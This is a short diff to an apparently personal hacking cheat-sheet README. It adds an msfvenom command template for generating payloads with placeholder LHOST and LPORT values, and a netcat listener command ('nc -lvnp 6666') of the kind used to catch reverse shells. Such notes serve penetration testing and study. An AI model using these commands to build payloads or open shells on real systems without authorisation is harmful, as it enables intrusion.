@@ -1,5 +1,21 @@
 # info-hacking-cheat-sheet
 
+## msfvenom
+
+create payload
+```bash
+msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -f <FILE_TYPE> -o <OUTPUT>
+```
+
+
+## netcat
+
+run server
+
+```bash
+nc -lvnp 6666
+```
+
 ## python
 
 run server python3
